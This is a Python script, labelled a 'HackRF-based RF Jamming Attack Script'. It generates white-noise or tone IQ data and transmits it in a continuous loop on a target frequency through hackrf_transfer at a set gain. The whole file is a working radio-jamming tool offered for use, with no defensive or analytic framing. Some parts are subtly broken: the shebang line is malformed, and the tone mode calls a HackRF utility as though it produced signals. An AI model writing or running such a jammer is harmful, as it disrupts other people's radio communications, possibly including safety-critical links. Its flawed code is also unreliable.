#!/usr/bin/env # (broadband or tone-based jamming)

import argparse
import subprocess
import os
import sys

JAMMER_IQ_FILE = "jammer_signal.iq"

def generate_tone_iq(sample_rate, frequency, duration):
    print(f"[+] Generating narrowband jamming tone (FM carrier)")
    command = [
        "hackrf_cpldj",
        "--frequency", str(frequency),
        "--sample-rate", str(sample_rate),
        "--duration", str(duration),
        "--output", JAMMER_IQ_FILE
    ]
    subprocess.run(command, check=True)

def generate_noise_iq(sample_rate, duration):
    print("[+] Generating white noise IQ file")
    samples = int(sample_rate * duration)
    with open(JAMMER_IQ_FILE, "wb") as f:
        for _ in range(samples):
            f.write(os.urandom(2))  # Simple pseudo-random noise

def transmit_jammer_signal(frequency, sample_rate, gain):
    print(f"[+] Transmitting jamming signal on {frequency/1e6:.2f} MHz")
    command = [
        "hackrf_transfer",
        "-t", JAMMER_IQ_FILE,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-x", str(gain),
        "-a", "1",
        "-R"
    ]
    subprocess.run(command)

def cleanup():
    if os.path.exists(JAMMER_IQ_FILE):
        os.remove(JAMMER_IQ_FILE)
        print("[+] Cleaned up temporary jammer IQ file.")

def main():
    parser = argparse.ArgumentParser(description="HackRF-based RF Jamming Attack Script")
    parser.add_argument("--frequency", type=int, required=True, help="Target frequency in Hz")
    parser.add_argument("--sample-rate", type=int, default=2000000, help="Sample rate (Hz)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of jammer signal (seconds)")
    parser.add_argument("--gain", type=int, default=40, help="Transmit gain (default: 40)")
    parser.add_argument("--mode", choices=["tone", "noise"], default="noise", help="Jammer mode (tone or noise)")

    args = parser.parse_args()

    try:
        if args.mode == "tone":
            generate_tone_iq(args.sample_rate, args.frequency, args.duration)
        else:
            generate_noise_iq(args.sample_rate, args.duration)

        transmit_jammer_signal(args.frequency, args.sample_rate, args.gain)

    except KeyboardInterrupt:
        print("\n[+] Jamming manually interrupted.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during transmission: {e}")
    finally:
        cleanup()

if __name__ == "__main__":
    main()
